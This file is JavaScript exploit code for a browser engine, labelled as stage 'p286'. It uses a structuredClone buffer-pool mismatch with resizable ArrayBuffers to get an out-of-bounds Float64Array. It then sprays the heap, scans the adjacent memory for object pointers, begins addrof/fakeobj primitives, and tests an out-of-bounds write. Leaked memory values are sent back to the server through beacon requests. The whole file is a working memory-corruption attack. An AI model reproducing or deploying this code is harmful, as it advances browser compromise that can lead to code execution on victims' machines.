// p286 — addrof + fakeobj from structuredClone pool mismatch OOB
//
// Prerequisite: p285 confirmed OOB works (V285-P2-OOB-CONFIRMED)
//
// Strategy:
// 1. Trigger the pool mismatch to get OOB Float64Array
// 2. Spray objects adjacent to the small buffer
// 3. Use OOB reads to find JSObject headers (structure ID, butterfly ptr)
// 4. Build addrof: read the JSValue encoding of a target object
// 5. Build fakeobj: write a crafted JSValue into a position read as object
//
// NaN-boxing (JSVALUE64):
//   Cell pointer: raw 48-bit ptr (upper 16 bits = 0x0000)
//   Int32: 0xFFFE0000 | value
//   Double: IEEE754 + 0x0002000000000000
//   isCell check: !(val & 0xFFFE000000000002)
//
// Beacon prefix: V286-

(function() {
  var BQ = 0;
  function B(tag, body) {
    var url = '/beacon/V286-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
    try {
      if (body !== undefined && String(body).length < 1500) {
        var x = new XMLHttpRequest();
        x.open('POST', url, true);
        x.send(String(body));
      } else {
        new Image().src = url;
      }
    } catch(e) { try { new Image().src = url; } catch(e2) {} }
  }

  function hex32(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  var MAX_BUF = 65536;

  // ===== Step 1: Get OOB Float64Array via pool mismatch =====
  function getOOBView() {
    var SMALL = 64;  // Small buffer for OOB base (bigger = more spray needed)
    var LARGE = 8192; // Large buffer for view size

    var ab_s = new ArrayBuffer(SMALL, {maxByteLength: MAX_BUF});
    var ab_l = new ArrayBuffer(LARGE, {maxByteLength: MAX_BUF});

    // Fill small buffer with sentinel
    var sentinel = new Float64Array(ab_s);
    for (var i = 0; i < sentinel.length; i++) sentinel[i] = 0xDEAD0000 + i;

    // Create view on large buffer
    var view = new Float64Array(ab_l);
    for (var i = 0; i < view.length; i++) view[i] = i + 1;

    var payload = {
      shift: 0n,
      small: ab_s,
      large: ab_l,
      oob_view: view
    };

    var cloned = structuredClone(payload);
    var tv = cloned.oob_view;

    if (tv.buffer.byteLength === SMALL) {
      B('OOB-OK-' + tv.length + '-on-' + tv.buffer.byteLength);
      return tv;
    } else {
      B('OOB-FAIL-buf-' + tv.buffer.byteLength);
      return null;
    }
  }

  var oob;
  try {
    oob = getOOBView();
  } catch(e) {
    B('OOB-ERR-' + e.message.substring(0, 40));
    return;
  }

  if (!oob) {
    B('NO-OOB-EXITING');
    return;
  }

  // ===== Step 2: Heap spray adjacent to small buffer =====
  // Allocate many small ArrayBuffers to fill the heap around our buffer
  // Then allocate objects whose addresses we want to leak

  var targetObj = {marker: 0x41414141, pad: 'AAAA'};
  var targetArr = [1.1, 2.2, 3.3, 4.4];
  var sprayObjs = [];
  for (var s = 0; s < 1000; s++) {
    sprayObjs.push({idx: s, ref: targetObj});
  }

  B('SPRAY-DONE');

  // ===== Step 3: Scan OOB for heap metadata =====
  var leakLines = [];
  var tmpBuf = new ArrayBuffer(8);
  var tmpF64 = new Float64Array(tmpBuf);
  var tmpDV = new DataView(tmpBuf);

  function readRawBits(f64val) {
    tmpF64[0] = f64val;
    return {
      hi: tmpDV.getUint32(4, true),
      lo: tmpDV.getUint32(0, true)
    };
  }

  function bitsToDouble(hi, lo) {
    tmpDV.setUint32(4, hi, true);
    tmpDV.setUint32(0, lo, true);
    return tmpF64[0];
  }

  // Scan OOB region for interesting patterns
  var cellPtrs = [];
  var structureIDs = [];

  for (var i = 0; i < Math.min(oob.length, 256); i++) {
    try {
      var val = oob[i];
      if (val === undefined) {
        leakLines.push(i + ':UNDEF');
        break; // hit unmapped memory
      }
      var bits = readRawBits(val);
      var full = hex32(bits.hi) + hex32(bits.lo);

      // Check for cell pointer (upper 16 bits near 0x0000, lower bits aligned)
      var upper16 = (bits.hi >>> 16) & 0xFFFF;
      if (upper16 === 0 && bits.lo !== 0) {
        cellPtrs.push(i + ':' + full);
      }

      // Check for tagged integer (0xFFFE prefix)
      if (upper16 === 0xFFFE) {
        leakLines.push(i + ':INT=' + (bits.lo | (((bits.hi & 0xFFFF) << 16) >>> 0)));
      }

      // Non-zero non-sentinel values
      if (val !== 0 && !isNaN(val) && val !== (0xDEAD0000 + i)) {
        leakLines.push(i + ':' + full);
      }
    } catch(e) {
      leakLines.push(i + ':ACCESS-ERR');
      break;
    }
  }

  B('SCAN-CELLS-' + cellPtrs.length, cellPtrs.slice(0, 10).join(' '));
  B('SCAN-DATA', leakLines.slice(0, 15).join(' '));
  if (leakLines.length > 15) {
    B('SCAN-DATA2', leakLines.slice(15, 30).join(' '));
  }

  // ===== Step 4: addrof primitive =====
  // For a proper addrof, we need to:
  // 1. Place a known object in a JSArray adjacent to our OOB buffer
  // 2. Read the JSValue encoding from OOB
  // 3. The raw bits give us the object's heap address
  //
  // This requires knowing the EXACT offset where the array's butterfly data starts.
  // For now, just report what we found in the heap scan.

  if (cellPtrs.length > 0) {
    B('HEAP-PTRS-FOUND-' + cellPtrs.length);

    // Try to find a pattern: two consecutive cell pointers could be
    // a JSObject header (structureID + butterfly)
    for (var p = 0; p < Math.min(cellPtrs.length - 1, 10); p++) {
      var idx1 = parseInt(cellPtrs[p]);
      var idx2 = parseInt(cellPtrs[p + 1]);
      if (idx2 === idx1 + 1) {
        B('ADJACENT-CELLS-' + idx1 + '-' + idx2);
      }
    }
  }

  // ===== Step 5: Write test =====
  // Try writing to an OOB slot and reading it back
  try {
    var writeIdx = oob.buffer.byteLength / 8 + 2; // First OOB slot + 2
    var origVal = oob[writeIdx];
    var origBits = readRawBits(origVal);
    oob[writeIdx] = bitsToDouble(0x41414141, 0x42424242);
    var newVal = oob[writeIdx];
    var newBits = readRawBits(newVal);
    oob[writeIdx] = origVal; // restore
    B('WRITE-TEST-ORIG-' + hex32(origBits.hi) + hex32(origBits.lo));
    B('WRITE-TEST-NEW-' + hex32(newBits.hi) + hex32(newBits.lo));
    if (newBits.hi === 0x41414141 && newBits.lo === 0x42424242) {
      B('WRITE-TEST-CONFIRMED');
    }
  } catch(e) {
    B('WRITE-TEST-ERR-' + e.message.substring(0, 40));
  }

  B('DONE');
})();
